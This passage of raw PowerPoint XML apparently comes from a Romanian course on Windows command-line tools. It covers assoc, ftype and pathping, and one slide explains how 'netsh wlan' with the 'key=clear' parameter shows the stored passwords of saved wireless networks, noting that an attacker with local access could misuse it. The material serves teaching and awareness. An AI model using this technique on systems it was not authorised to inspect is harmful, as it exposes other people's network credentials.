            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
              </a:rPr>
              <a:t> afișează sau modifică asocierile tipurilor de fișiere iar </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="1">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ftype</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
              </a:rPr>
              <a:t> afișează sau modifică tipurile de fișiere utilizate în asocierile de extensii de fișiere. Împreună, acestea pot fi folosite pentru a schimba programul care deschide un anumit tip de fișier.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" lvl="0" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>assoc .txt ftype txtfile</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" lvl="0" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1200">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="228600" lvl="0" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
              </a:rPr>
              <a:t>PathPing</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
              </a:rPr>
              <a:t>: O comandă care combină caracteristicile </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="1">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Ping</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
              </a:rPr>
              <a:t> și </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="1">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Traceroute</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
              </a:rPr>
              <a:t> oferind detalii despre calea dintre două noduri de rețea și statistici ping pentru fiecare nod.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" lvl="0" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>pathping example.com </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Flowchart: Process 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="283463" y="898071"/>
            <a:ext cx="11712593" cy="584381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186005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BDB55-7A4D-FD5A-6E52-5263D76F83BD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4375148" y="533400"/>
            <a:ext cx="7600951" cy="877888"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" sz="3600" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>Extragerea</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="3600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="3600" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>profilurilor</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="3600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> wireless </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="3600" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>salvate</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" sz="3600" dirty="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674BE886-B1D9-A638-AEF9-14BFBBB807F2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4489451" y="2841625"/>
            <a:ext cx="7423149" cy="3482975"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="70000" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>Windows </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>permite</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>interogarea</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>profilurilor</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> wireless </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>salvate</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>prin</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>utilitarul</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>netsh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>wlan</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>Atunci </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>când</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>comanda</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> este </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>executată</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> cu </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>parametrul</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>key=clear</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>sistemul</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>operare</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>poate</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>afișa</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>parola</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>în</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>clar</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>asociată</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>unei</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>rețele</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>conectate</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> anterior. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>Acest</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>mecanism</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>ilustrează</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>modul</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>în</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> care </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>utilitarele</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> administrative </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>legitime</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> pot </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>expune</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>credențiale</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>sensibile</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>dacă</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> un </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>atacator</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>obține</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>acces</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> local la </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>sistem</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1">
                <a:solidFill>
